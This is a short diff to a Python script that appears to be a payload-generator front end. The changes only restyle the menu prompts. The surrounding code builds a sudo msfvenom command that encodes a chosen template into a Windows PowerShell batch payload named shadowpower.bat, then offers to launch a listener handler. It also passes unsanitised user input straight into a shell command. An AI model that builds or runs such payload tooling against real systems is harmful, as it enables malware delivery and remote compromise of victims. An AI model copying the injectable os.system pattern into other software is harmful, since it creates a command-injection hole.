@@ -5,7 +5,7 @@ def menu():
     print("─╼┤ARCHITECTURE├───────────────────────────────────\n")
     print("\t\t(1) osx-app")
     print("\t\t(2) powershell\n")
-    mode = input("─╼┤SELECTION├─> ")
+    mode = input("────╼┤SELECTION├─> ")
     payloadGenerator(mode)
 
 def payloadGenerator(mode):        
@@ -19,13 +19,13 @@ def payloadGenerator(mode):
     elif mode == "2":
         print("─╼┤TEMPLATES├──────────────────────────────────────\n")
         os.system("ls templates")
-        template = input("\n─╼┤SELECTION├─> ")
+        template = input("\n────╼┤SELECTION├─> ")
         print("\n")
         command = "sudo msfvenom -p generic/custom PAYLOADFILE=templates/"+template+" -a x86 --platform win -e psbase NOEXIT SYSWOW64 -o shadowpower.bat"
         os.system(command)
         
     print("\n")
-    handler = input("─╼┤LAUNCH HANDLER?(Y/n)├─> ")
+    handler = input("────╼┤LAUNCH HANDLER?(Y/n)├─> ")
     if handler == "y":
         launchHandler()
     elif handler == "Y":
